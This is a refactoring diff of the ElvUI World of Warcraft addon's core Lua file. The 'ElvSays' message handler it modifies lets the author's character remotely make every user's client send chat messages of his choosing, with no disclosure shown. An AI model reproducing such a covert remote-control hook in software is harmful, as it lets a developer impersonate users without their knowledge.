@@ -3,6 +3,11 @@ local LSM = LibStub("LibSharedMedia-3.0")
 local _, ns = ...
 local ElvUF = ns.oUF
 
+local find = string.find
+local split = string.split
+local match = string.match
+local wipe = table.wipe
+
 --Constants
 _, E.myclass = UnitClass("player");
 E.myname, _ = UnitName("player");
@@ -11,8 +16,8 @@ E.version = GetAddOnMetadata("ElvUI", "Version");
 E.myrealm = GetRealmName();
 _, E.wowbuild = GetBuildInfo(); E.wowbuild = tonumber(E.wowbuild);
 E.resolution = GetCVar("gxResolution")
-E.screenheight = tonumber(string.match(E.resolution, "%d+x(%d+)"))
-E.screenwidth = tonumber(string.match(E.resolution, "(%d+)x+%d"))
+E.screenheight = tonumber(match(E.resolution, "%d+x(%d+)"))
+E.screenwidth = tonumber(match(E.resolution, "(%d+)x+%d"))
 
 --Tables
 E["media"] = {};
@@ -283,7 +288,7 @@ E.UIParent = CreateFrame('Frame', 'ElvUIParent', UIParent);
 E.UIParent:SetFrameLevel(UIParent:GetFrameLevel());
 E.UIParent:SetPoint('CENTER', UIParent, 'CENTER');
 E.UIParent:SetSize(UIParent:GetSize());
-tinsert(E['snapBars'], E.UIParent)
+E['snapBars'][#E['snapBars'] + 1] = E.UIParent
 
 E.HiddenFrame = CreateFrame('Frame')
 E.HiddenFrame:Hide()
@@ -379,7 +384,7 @@ function E:CheckIncompatible()
 end
 
 function E:IsFoolsDay()
-	if string.find(date(), '04/01/') and not E.global.aprilFools then
+	if find(date(), '04/01/') and not E.global.aprilFools then
 		return true;
 	else
 		return false;
@@ -420,13 +425,13 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not string.find(sender, "Elvz%-Kil'jaeden") and not E.recievedOutOfDateMessage then
+		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not find(sender, "Elvz%-Kil'jaeden") and not E.recievedOutOfDateMessage then
 			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Kil'jaeden") or string.find(sender, "Elvz%-Kil'jaeden")) then ---HAHHAHAHAHHA
-			local user, channel, msg, sendTo = string.split(',', message)
+		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Kil'jaeden") or find(sender, "Elvz%-Kil'jaeden")) then ---HAHHAHAHAHHA
+			local user, channel, msg, sendTo = split(',', message)
 			
 			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
 				SendChatMessage(msg, channel, nil, sendTo)
@@ -568,12 +573,12 @@ function E:RegisterModule(name)
 	if self.initialized then
 		self:GetModule(name):Initialize()
 	else
-		tinsert(self['RegisteredModules'], name)
+		self['RegisteredModules'][#self['RegisteredModules'] + 1] = name
 	end
 end
 
 function E:RegisterInitialModule(name)
-	tinsert(self['RegisteredInitialModules'], name)
+	self['RegisteredInitialModules'][#self['RegisteredInitialModules'] + 1] = name
 end
 
 function E:InitializeInitialModules()
@@ -590,7 +595,7 @@ end
 
 function E:RefreshModulesDB()
 	local UF = self:GetModule('UnitFrames')
-	table.wipe(UF.db)
+	wipe(UF.db)
 	UF.db = self.db.unitframe
 end
 
@@ -612,9 +617,9 @@ function E:DBConversions()
 end
 
 function E:Initialize()
-	table.wipe(self.db)
-	table.wipe(self.global)
-	table.wipe(self.private)
+	wipe(self.db)
+	wipe(self.global)
+	wipe(self.private)
 	
 	self.data = LibStub("AceDB-3.0"):New("ElvDB", self.DF);
 	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
@@ -642,7 +647,7 @@ function E:Initialize()
 		self:Install()
 	end
 	
-	if not string.find(date(), '04/01/') then	
+	if not find(date(), '04/01/') then	
 		E.global.aprilFools = nil;
 	end
 	
